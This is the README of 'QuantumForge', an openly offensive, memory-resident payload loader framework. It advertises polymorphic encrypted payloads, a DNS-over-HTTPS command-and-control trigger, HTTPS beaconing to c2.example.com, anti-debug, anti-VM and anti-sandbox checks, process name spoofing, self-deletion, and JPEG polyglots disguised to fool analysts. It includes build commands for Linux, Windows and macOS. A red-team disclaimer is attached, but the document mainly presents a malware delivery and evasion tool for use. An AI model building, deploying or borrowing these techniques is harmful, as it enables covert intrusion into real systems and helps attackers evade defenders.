# QuantumForge 

> **Cross-Platform, Memory-Resident Payload Framework**  
> _Polymorphic | AES+HKDF Encrypted | DNS-over-HTTPS Trigger | No Disk Writes_

---

## DISCLAIMER

**For educational and authorized red team engagements only.**  
Use of this code without proper authorization may violate laws and ethical guidelines.  
**You are responsible for your actions.**

---

## Overview

**QuantumForge** is an advanced post-exploitation loader framework with the following goals:

- **Cross-platform compatibility** (Linux, macOS, Windows)
- **In-memory execution** only (no disk writes)
- **Polymorphic, self-modifying loader**
- **AES-256-CBC + HKDF** payload encryption
- **Modular second-stage loading**:
  - Shellcode
  - Reflective `.so`/`.dll` injection (stage2)
- **C2 trigger via DNS-over-HTTPS**
- **Beaconing via HTTPS POST**
- **Static and behavioral anti-analysis defenses**

---

## upported Platforms

| Platform | Loader | Features |
|----------|--------|----------|
| Linux  | `quantum_server` | `memfd_create`, `dlopen` second-stage, anti-debug, anti-vm |
| Windows | `quantum_loader_win.exe` | Reflective DLL (planned), Bcrypt AES, WinHttp beacon |
| macOS  | `quantum_loader_mac` | `mach_vm_allocate` shellcode exec, CCCrypt AES, curl beacon |

---

## ⚙Features

- **AES-256-CBC + HKDF** encryption (OpenSSL / Bcrypt / CCCrypt)
- **XOR-masked memory** post-decryption
- **Polymorphic payloads** with randomized NOP sleds (`junk.h`)
- **DNS-over-HTTPS activation trigger**
- **HTTPS beaconing** (base64-encoded POST)
- **Second-stage loader**:
  - Linux: `dlopen()` from `memfd_create`
  - Windows: Reflective loader (stub included)
  - macOS: Shellcode (Mach-O loader optional)
- **Self-delete & unlink** logic
- **Anti-debug, anti-vm, anti-sandbox** (RDTSC, sysctl, CPUID, etc)
- **JPEG polyglot** creation for social engineering
- **Section scrubbing + mprotect(PROT_NONE)** to erase decrypted data
- **Process name spoofing** (`[kworker]`, `svchost.exe`, `launchd`)

---

## Usage

1️⃣ Build Linux Payload

```bash
./quantum_forge.sh cat.jpg payload.bin 00112233445566778899aabbccddeeff 0123456789abcdef
Output: cat.jpg (JPEG+ELF polyglot)
```
2️⃣ Build Windows Payload
```powershell
.\quantum_forge_win.ps1 -Image "cat.jpg" -Payload "win_payload.bin" `
  -BaseKey "QuantumKey123456" -Salt "FixedSalt456" -IV "1234567890abcdef"
Output: cat.jpg (JPEG+EXE polyglot)
```
3️⃣ Build macOS Payload
```bash
./quantum_forge_mac.sh cat.jpg payload_macos.bin QuantumKey123 FixedSalt456 1234567890abcdef
Output: cat.jpg (JPEG+Mach-O polyglot)
```
###  Runtime Flags
Flag	Description
--no-doh	Skip DNS-over-HTTPS activation
--no-selfdelete	Do not delete the binary after execution
--fallback-only	Serve payload over HTTP on port 8080 only


### C2 Trigger + Beacon (DNS-over-HTTPS)
Trigger payload execution remotely:
TXT record for c2.example.com:
"C2_TRIGGER:1"
Beacon is sent via POST https://c2.example.com/beacon
Payload: base64-encoded shellcode or second-stage blob.


###  Analysis Evasion
Technique	Description
junk.h	Random instructions for each build (nop, mov, lea, etc.)
Section renaming	Random .text section name per build
Memory wiping	mprotect(PROT_NONE) and scramble_self() to zero disk image
Anti-debug	Checks TracerPid, ptrace, or Win NtQueryInformationProcess
Anti-vm	CPUID vendor string check (e.g. KVMKVMKVM, VMwareVMware)
Anti-sandbox	Sleep delta check using RDTSC or high-precision timers


### Second-Stage Support

QuantumForge supports modular payloads:

| Type                | Linux                       | Windows              | macOS                        |
|---------------------|-----------------------------|----------------------|------------------------------|
| Shellcode           | ✅                          | ✅                   | ✅                           |
| ELF binary          | ✅ `exec_memfd()`           | ❌                   | ❌                           |
| Shared object (.so) | ✅ via `dlopen("/proc/self/fd")` | ❌ *(planned)*     | ❌                           |
| Reflective DLL (.dll) | ❌                        | 🚧 *(stub included)* | ❌                           |
| Mach-O dylib        | 🚧 *(planned)*              | ❌                   | 🚧 *(planned via custom loader)* |

---
### 🧷 Notes
Payload encryption is never stored in plaintext on disk.

All second-stage logic executes entirely in memory.

Polyglot payloads will open as JPEGs when inspected by analysts or tools.


## Warning
Do not use it without legal authorization. Abuse will not be tolerated or supported.

---
## License
MIT License for research and educational use.






